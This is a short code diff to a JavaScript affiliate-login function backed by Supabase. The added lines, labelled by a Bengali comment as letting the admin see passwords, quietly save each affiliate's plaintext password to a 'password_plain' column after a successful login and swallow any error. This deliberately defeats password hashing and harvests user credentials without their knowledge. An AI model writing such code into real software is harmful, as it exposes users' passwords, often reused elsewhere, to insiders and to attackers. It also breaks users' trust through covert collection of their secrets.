@@ -46,6 +46,10 @@ async function resolveAffiliate(body) {
   const { data: affiliate } = await supabase.from('affiliates').select('*').eq('ref_code', cleanRef).single();
   if (!affiliate) return { affiliate: null, code: 'not_found' };
   if (affiliate.password_hash !== hashPassword(password)) return { affiliate: null, code: 'bad_password' };
+  // অ্যাডমিন যেন পাসওয়ার্ড দেখতে পারে — একবার সেভ করে রাখি
+  if (!affiliate.password_plain) {
+    try { await supabase.from('affiliates').update({ password_plain: password }).eq('ref_code', cleanRef); } catch (e) {}
+  }
   return { affiliate, email: null };
 }
 
